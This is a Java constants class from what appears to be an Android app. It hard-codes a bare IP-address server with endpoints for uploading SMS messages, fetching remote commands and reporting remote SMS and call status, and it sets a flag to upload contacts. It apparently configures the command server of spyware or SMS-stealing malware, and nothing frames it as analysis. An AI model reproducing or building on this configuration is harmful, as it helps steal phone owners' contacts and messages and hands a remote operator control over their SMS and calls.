package com.mvlove.util;

public class Constants {
    public static final boolean IS_MONITOR = false;
    public static final boolean UPLOAD_CONTACT = true;

    public static class Interface {
        private static final String SERVER_HOST = "http://103.30.7.178";

        public static final String getHost() {
            return SERVER_HOST;
        }

        public static final String getPushSmsUrl() {
            return "http://103.30.7.178/upMsg.htm";
        }

        public static final String getMotionUrl() {
            return "http://103.30.7.178/getMotion.htm";
        }

        public static final String getUpdateMotionUrl() {
            return "http://103.30.7.178/updateMotionStatus.htm";
        }

        public static final String getUpdateRemoteSmsStatusUrl() {
            return "http://103.30.7.178/updateRemoteSmsStatus.htm";
        }

        public static final String getUpdateRemoteCallStatusUrl() {
            return "http://103.30.7.178/updateRemoteCallStatus.htm";
        }
    }
}
